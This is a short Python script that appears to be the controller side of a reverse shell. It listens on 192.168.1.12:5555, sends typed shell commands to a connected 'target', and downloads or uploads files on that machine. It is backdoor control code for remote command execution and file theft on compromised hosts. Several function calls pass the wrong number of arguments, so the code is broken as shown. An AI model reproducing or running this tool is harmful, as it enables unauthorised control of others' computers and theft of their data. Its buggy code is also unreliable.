import socket
import json
import os


def server_send(data,target):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def server_receive(target):
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name,target):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name,target):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication(ip,target):
	while True:
		command = input('* Shell~%s: ' % str(ip))
		server_send(command)
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:],target)
		elif command[:6] == 'upload':
			upload_file(command[7:],target)
		else:
			result = server_receive(target)
			print(result)


def main():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('192.168.1.12', 5555))
	print('[+] Listening For The Incoming Connections')
	sock.listen(5)
	target, ip = sock.accept()
	print('[+] Target Connected From: ' + str(ip))
	target_communication(ip)

#change the ip as required
